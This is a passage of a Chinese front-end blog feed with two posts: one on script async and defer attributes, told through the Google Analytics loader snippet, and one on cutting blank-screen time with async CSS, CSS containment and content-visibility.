我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 